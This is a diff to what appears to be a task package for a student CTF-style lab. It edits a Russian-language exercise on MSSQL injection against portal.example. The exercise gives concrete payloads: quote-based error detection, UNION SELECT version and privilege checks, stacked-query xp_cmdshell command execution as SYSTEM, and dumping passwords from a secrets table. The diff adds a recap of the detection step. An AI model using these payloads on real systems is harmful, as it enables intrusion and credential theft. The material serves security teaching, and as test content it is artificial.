@@ -13,7 +13,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: MSSQL-инъекция на portal.example\n\nЦель — `http://portal.example/user?id=1` (ASP.NET + MSSQL).\n\n1. Диалект: `curl -s \"http://portal.example/user?id=1'\"` → `Unclosed quotation mark`.\n2. Версия: `... UNION SELECT 1,@@version,3-- -`.\n3. Права: `... UNION SELECT 1,CAST(is_srvrolemember('sysadmin') AS varchar),3-- -` → `1`.\n4. RCE: `curl -s \"http://portal.example/user?id=1;EXEC xp_cmdshell 'whoami'-- -\"` → `nt authority\\\\system`.\n5. Флаг: `... UNION SELECT 1,STRING_AGG(password,CHAR(10)),3 FROM secrets-- -`.\n6. `... | grep 'nto' > found.txt`, затем `check`.\n"
+      "text": "# Практика: MSSQL-инъекция на portal.example\n\nЦель — `http://portal.example/user?id=1` (ASP.NET + MSSQL).\n\n1. Диалект: `curl -s \"http://portal.example/user?id=1'\"` → `Unclosed quotation mark`.\n2. Версия: `... UNION SELECT 1,@@version,3-- -`.\n3. Права: `... UNION SELECT 1,CAST(is_srvrolemember('sysadmin') AS varchar),3-- -` → `1`.\n4. RCE: `curl -s \"http://portal.example/user?id=1;EXEC xp_cmdshell 'whoami'-- -\"` → `nt authority\\\\system`.\n5. Флаг: `... UNION SELECT 1,STRING_AGG(password,CHAR(10)),3 FROM secrets-- -`.\n6. `... | grep 'nto' > found.txt`, затем `check`.\n\n## Повторение (`web-sqli`)\n\nПрежде чем звать `xp_cmdshell`, вспомни из `web-sqli` первый шаг — **определение СУБД по ошибке**. Подставь кавычку в параметр:\n\n    curl -s \"http://portal.example/user?id=1'\"\n\n`Unclosed quotation mark` и `@@version` — признаки MSSQL; только после этого переходи к `-- -`, `CAST` и системным процедурам.\n"
     }
   ],
   "tools": {
